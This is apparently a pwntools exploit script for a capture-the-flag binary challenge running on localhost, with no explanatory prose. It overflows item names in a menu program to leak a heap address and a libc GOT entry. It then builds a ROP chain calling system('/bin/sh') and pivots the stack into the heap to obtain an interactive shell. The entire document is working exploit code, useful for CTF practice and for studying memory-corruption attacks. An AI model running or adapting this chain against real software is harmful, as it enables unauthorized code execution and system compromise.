from pwn import *
from Crypto.Util.number import bytes_to_long

p = remote('localhost', 9999)

prog = ELF('../src/chall')
libc = ELF('../src/libc-2.27.so')
gadget = 0x0000000000400e06 # lea eax, [rbp - 3]; mov rdi, rax; call 0x6b0; leave; ret;
pop_rdi = 0x0000000000400f63
pop_rsi_r15 = 0x0000000000400f61

binsh_offset = list(libc.search(b'/bin/sh'))[0]
system_offset = libc.symbols['system']
_offset = libc.symbols['__libc_start_main']
_got = prog.got['__libc_start_main']

def add_item(item_name, item_price):
    p.sendline(b'1')
    p.sendline(item_name)
    p.sendline(item_price)
    p.recvuntil(b'Item added successfully.')

def sell_item(idx, testimony):
    p.sendline(b'5')
    p.sendline(idx)
    p.sendline(testimony)
    p.interactive()

def edit_item(idx, item_name, item_price):
    p.sendline(b'3')
    p.sendline(idx)
    p.sendline(item_name)
    p.sendline(item_price)
    p.recvuntil(b'Item edited successfully.')

def list_item():
    p.sendline(b'4')
    return p.recvuntil(b'=\n\n')

# leak heap address
add_item(b'A', b'1') #items[0]
add_item(b'A', b'1') #items[1]

edit_item(b'0', b'A' * 8 * 6, b'1')
edit_item(b'1', b'A', b'-1')

res = list_item()
res = res.split(b'\n')[-9][62:]
heap_address = bytes_to_long(res[::-1])
#print('heap_address =', hex(heap_address))

# leak libc base
add_item(b'A', b'1') #items[2]
add_item(b'A', b'1')
payload = b'A' * 8 * 7
payload += p64(_got)
edit_item(b'2', payload, b'1')
res = list_item()
res = res.split(b'\n')[-6][6:]
_addr = bytes_to_long(res[::-1])
libc_base = _addr - _offset
binsh_addr = binsh_offset + libc_base
system_addr = system_offset + libc_base
#print('system_addr =', hex(system_addr))

# rop
add_item(b'A', b'1') #items[4]
add_item(b'A', b'1')
add_item(b'A', b'1')

payload = b'A' * 8
payload += p64(pop_rdi)
payload += p64(binsh_addr)
payload += p64(pop_rsi_r15)
payload += p64(0)
payload += p64(0)
payload += p64(system_addr)
edit_item(b'4', payload, b'1')

payload = b'A' * 8 * 3
payload += b'A' * 4
payload += p32(6) # idx that will be freed is in the stack, overwriting it sill resulting an error
payload += b'A' * 8 * 2
payload += p64(heap_address + 0x50 * 3) # items[4].name, this will be the new rsp at the end of gadget call
payload += p64(gadget) # to make rop in heap possible
sell_item(b'5', payload)
